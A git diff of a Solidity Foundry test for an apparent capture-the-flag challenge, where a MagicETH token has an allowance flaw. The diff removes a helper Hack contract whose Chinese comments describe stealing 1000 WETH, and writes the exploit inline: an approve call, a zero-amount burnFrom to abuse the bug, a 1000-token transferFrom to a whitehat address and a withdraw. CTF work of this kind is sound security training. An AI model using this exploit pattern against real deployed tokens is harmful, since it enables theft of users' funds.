@@ -17,43 +17,7 @@ import {MagicETH} from "../src/1_MagicETH/MagicETH.sol";
 //    If you need a contract for your hack, define it below //
 ////////////////////////////////////////////////////////////*/
 
-contract Hack {
-    //mETH是一个代币
-    MagicETH public mETH;
-    //owner就是exploiter，我要窃取他的1000weth，然后变为eth
-    address public owner;
-    
-    constructor(MagicETH meth, address _owner) {
-        mETH = meth;
-        owner = _owner;
-    }
 
-    function hack() public {
-        // 批准exploiter用攻击合约代币，这是为了利用MagicETH里的漏洞
-        mETH.approve(address(owner), type(uint256).max);
-
-        //确保批准成功
-        uint256 currentAllowance = mETH.allowance(address(this),owner);
-        require(currentAllowance == type(uint256).max,"approve failed");
-
-
-        uint256 ownerBalance = mETH.balanceOf(owner);
-        
-
-        // 利用漏洞
-        mETH.burnFrom(owner, 0 ether);
-
-        // 确保能够从所有者地址成功转移代币
-        mETH.transferFrom(owner, address(this), 1000 ether);
-        require(ownerBalance == 0 ether, "transfer failed");
-        
-        //转化weth为eth
-        mETH.deposit{value: 1000 ether}();
-
-        mETH.withdraw(1000 ether);
-        //forge test --match-path test/Challenge1.t.sol  进行测试
-    }
-}
 
 
 /*////////////////////////////////////////////////////////////
@@ -81,10 +45,14 @@ contract Challenge1Test is Test {
         // terminal command to run the specific test:       //
         // forge test --match-contract Challenge1Test -vvvv //
         ////////////////////////////////////////////////////*/
+        
+        mETH.approve(exploiter,type(uint256).max);
+        mETH.burnFrom(exploiter, 0 ether);
+        mETH.transferFrom(exploiter, whitehat, 1000 ether);
+        //注意将weth转化为eth
+        mETH.withdraw(1000 ether);
 
-        Hack hackcontract = new Hack(mETH,exploiter);
-        hackcontract.hack();
-
+        
 
 
         //==================================================//
@@ -95,4 +63,4 @@ contract Challenge1Test is Test {
 }
 
 ```
-还有点问题明天更改
+
